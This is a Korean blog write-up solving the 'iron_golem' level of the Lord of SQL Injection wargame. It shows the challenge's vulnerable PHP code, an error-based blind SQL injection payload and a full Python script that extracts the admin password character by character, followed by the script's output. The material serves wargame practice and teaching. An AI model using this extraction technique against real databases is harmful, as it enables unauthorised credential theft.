---
title: "[Lord of SQL Injection] LoS - iron_golem 문제풀이"
date: 2018-08-16
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제는 `Error`를 기반으로 한 `Error Based Blind SQL Injection` 이다.
`iron_golem` 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------------
query : select id from prob_iron_golem where id='admin' and pw=''
------------------------------------------------------------------------------------------

<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit(mysql_error());
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

이번에는 `Hello guest` 처럼 내가 누구인지를 출력 해 주는 부분이 없다.
또한 `sleep`와 `benchmark`가 필터링 되어 있기 때문에 `Time Based Blind SQL Injection`을 사용할 수 없다.
대신 `if(mysql_error()) exit(mysql_error());`가 추가되었다.
때문에 내가 입력한 쿼리에서 에러가 발생할 경우, 이 에러를 확인할 수 있다.
그래서 만약 내가 확인하고자 하는 조건이 `참`일 경우 `에러를 출력`하고, 아닐 경우에는 출력하지 않도록 공격 쿼리를 구성 해 보았다.  

```plain
id = 'admin' and if(length(pw)=1, (select 1 union select 2), 2)
```

위와 같이 쿼리를 구성 할 경우, 만약 `length(pw)=1`이 `참`이라면, `select 1 union select 2`를 실행할 것이고, 아니라면 `2`를 실행하게 된다.
그런데 `select 1 union select 2`를 실행하면 `Subquery returns more than 1 row` 라는 에러를 출력 해 준다.
따라서 이를 통해 패스워드의 길이와 각 글자를 알아낼 수 있다.
처음에는 단순히 해당 쿼리만을 사용 해 코드를 구현했는데, 결과 값이 나오지 않아 다시 확인 해 보니 이번에도 `pw`가 한글인 것 같았다.
그래서 `xavis` 문제의 코드를 가져와 `hex`로 출력하던 값을 `decimal`로 출력하도록 해 다시 아래와 같이 소스코드를 구현했다.  

```python
import requests

def testEqual(j, num):
        try:
                query = url + "1' or id='admin' and if(ord(substr(pw, " + str(j) + ", 1)) = " + str(num) + ", (select 1 union select 2), 2)%23"
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
        
        if 'Subquery returns more than 1 row' in r.text:
                return True
        else:
                return False

def testBigger(j, num):
        try:
                query = url + "1' or id='admin' and if(ord(substr(pw, " + str(j) + ", 1)) < " + str(num) + ", (select 1 union select 2), 2)%23"
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
        
        if 'Subquery returns more than 1 row' in r.text:
                return True
        else:
                return False

def searchPw(j, start, end):
        if start > end:
                return "None"

        mid = (start + end) / 2

        if testEqual(j, mid):
                return mid
        elif testBigger(j, mid):
                end = mid - 1
        else:
                start = mid + 1

        return searchPw(j, start, end)
               
flag = ""
length = 0

url = "http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 100):
        try:
                query = url + "1' or id='admin' and if(length(pw)=" + str(i) + ", (select 1 union select 2), 2)%23"
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
                continue

        if 'Subquery returns more than 1 row' in r.text:
                length = i
                break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
        flag += str(searchPw(j, 0, 65535)) + " "
        print "[+] Found ", str(j), "'s pw : ", flag

print "[+] Found password : ", flag
print "[+] End"
```

그 결과 아래와 같이 이번에도 18번째 글자 부터는 `null`이라는 것을 알 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  68
[+] Find password
[+] Found  1 's pw :  47336 
[+] Found  2 's pw :  47336 48708 
[+] Found  3 's pw :  47336 48708 44732 
[+] Found  4 's pw :  47336 48708 44732 50556 
[+] Found  5 's pw :  47336 48708 44732 50556 33 
[+] Found  6 's pw :  47336 48708 44732 50556 33 48764 
[+] Found  7 's pw :  47336 48708 44732 50556 33 48764 50528 
[+] Found  8 's pw :  47336 48708 44732 50556 33 48764 50528 50528 
[+] Found  9 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 
[+] Found  10 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 
[+] Found  11 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 
[+] Found  12 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 
[+] Found  13 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 
[+] Found  14 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 
[+] Found  15 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 
[+] Found  16 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 
[+] Found  17 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 
[+] Found  18 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 
[+] Found  19 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 
[+] Found  20 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 
[+] Found  21 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 
[+] Found  22 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 
[+] Found  23 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 
[+] Found  24 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 
[+] Found  25 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 
[+] Found  26 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 
[+] Found  27 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 
[+] Found  28 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  29 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  30 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  31 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  32 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  33 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  34 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  35 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  36 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  37 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  38 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  39 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  40 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  41 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  42 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  43 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  44 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  45 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  46 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  47 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  48 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  49 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  50 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  51 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  52 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  53 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  54 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  55 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  56 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  57 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  58 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  59 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  60 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  61 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  62 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  63 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  64 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  65 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  66 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  67 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found  68 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] Found password :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
[+] End
```

이렇게 결과로 나온 값을 `xavis` 문제에서 사용했던 [사이트](https://www.branah.com/unicode-converter)에서 돌려 보았더니 `루비꺼야!빼애애애애애애애액!!!`이라는 값을 얻을 수 있었다.
~~당황...~~
그래서 이 값을 `pw` 값으로 넘겨주었더니 문제를 풀 수 있었다.  

```plain
?pw=루비꺼야!빼애애애애애애애액!!!
```

---

```php
------------------------------------------------------------------------------------------------------------------------------
query : select id from prob_iron_golem where id='admin' and pw='루비꺼야!빼애애애애애애애액!!!'
------------------------------------------------------------------------------------------------------------------------------

IRON_GOLEM Clear!
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit(mysql_error());
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

---

```plain
IRON_GOLEM Clear!!
```